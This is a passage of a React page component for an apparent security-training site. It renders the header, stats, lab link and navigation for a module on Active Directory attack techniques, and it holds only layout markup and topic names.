        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,65,54,0.35)' }}>ACTIVE DIRECTORY ATTACKS</h1>
        <p style={{ color: '#6a5a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.6 }}>
          Architecture · BloodHound · Kerberoasting · AS-REP Roasting · Pass-the-Hash · DCSync · Golden Tickets · LLMNR · SMB Relay · Lateral Movement
        </p>
      </div>

      {/* Chapter overview stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '12px', marginBottom: '2.5rem' }}>
        {[
          ['8', 'CHAPTERS'],
          ['~2.8hr', 'TOTAL READ'],
          ['ADVANCED', 'DIFFICULTY'],
          ['MOD-05', 'IDENTIFIER'],
        ].map(([val, label], i) => (
          <div key={i} style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.15)', borderRadius: '6px', padding: '1rem', textAlign: 'center' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', fontWeight: 700, color: accent }}>{val}</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.6rem', color: '#4a1a1a', letterSpacing: '0.15em', marginTop: '2px' }}>{label}</div>
          </div>
        ))}
      </div>

      <ModuleCodex moduleId="active-directory" accent={accent} chapters={chapters} />

      {/* Bottom navigation */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a0808' }}>
        <div style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#4a1a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: accent, marginBottom: '0.5rem', fontWeight: 600 }}>MOD-05 Interactive Lab</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a1a1a', marginBottom: '1.5rem' }}>22 steps &middot; 495 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: accent, padding: '12px 32px', border: '1px solid rgba(255,65,54,0.6)', borderRadius: '6px', background: 'rgba(255,65,54,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(255,65,54,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a1a1a' }}>&#8592; MOD-04: OFFENSIVE</Link>
          <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a1a1a' }}>MOD-06: WEB ATTACKS &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
